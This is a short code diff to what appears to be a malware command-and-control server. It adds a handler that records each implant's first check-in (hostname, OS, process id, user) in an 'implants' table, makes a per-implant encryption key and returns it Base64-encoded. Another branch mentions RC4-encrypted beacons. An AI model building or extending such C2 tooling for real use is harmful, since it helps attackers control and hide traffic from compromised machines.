@@ -63,12 +63,28 @@ class WebServer(object):
             process_id = j["p"]
             current_user = j["u"]
 
+            # gets current time (uses server's time)
+            now = datetime.datetime.now()
+            current_time = now.strftime("%Y-%m-%d %H:%M:%S")
+
             # generates a random 32 character encryption key
             # (upper and lower, no numbers)
             key = "".join(random.SystemRandom().choice(string.ascii_letters)
                           for _ in range(32))
 
-            return key
+            # INSERTS an entry into the "implants" table
+            with self.connection:
+                cursor = self.connection.cursor()
+                cursor.execute("INSERT INTO implants VALUES (?,?,?,?,?,?)",
+                               (hostname,
+                                operating_system,
+                                process_id,
+                                current_user,
+                                key,
+                                current_time))
+
+            # returns Base64 encoded encryption key in the HTTP response
+            return base64.b64encode(key.encode())
 
         # else RC4-encrypted beacon
         else:
